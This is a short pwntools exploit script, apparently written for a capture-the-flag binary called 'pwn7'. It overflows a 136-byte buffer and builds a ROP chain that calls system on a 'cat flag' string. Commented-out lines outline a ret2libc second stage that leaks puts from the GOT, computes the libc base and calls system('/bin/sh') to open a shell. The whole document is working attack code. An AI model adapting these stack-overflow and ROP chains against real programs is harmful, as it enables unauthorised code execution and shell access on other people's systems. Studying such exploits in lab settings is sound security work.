from pwn import *

context.binary = binary = ('./pwn7')

p = process('./pwn7')

elf = ELF(binary)
rop = ROP(elf)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# gdb.attach(p)

cat_flag = 0x402037
system = 0x4010f0

p.sendline(b'1')
payload = b'A'*136
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(cat_flag)
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(system)
# payload += p64(elf.got.puts)
# payload += p64(elf.plt.puts)
# payload += p64(elf.symbols.main)

p.sendline(payload)

# p.recvline()
# p.recvline()
# p.recvline()
# p.recvline()

# leak = u64(p.recvline().strip().ljust(8, b'\x00'))
# print(hex(leak))

# p.sendline(b'1')

# base = leak - libc.symbols.puts
# print(hex(base))

# system = base + libc.symbols.system
# print(hex(system))

# binsh = base + next(libc.search(b'/bin/sh\x00'))
# print(hex(binsh))

# payload1 = b'A'*136
# payload1 += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
# payload1 += p64(binsh)
# payload1 += p64(rop.find_gadget(['ret'])[0])
# payload1 += p64(system)

# p.sendline(payload1)

p.interactive()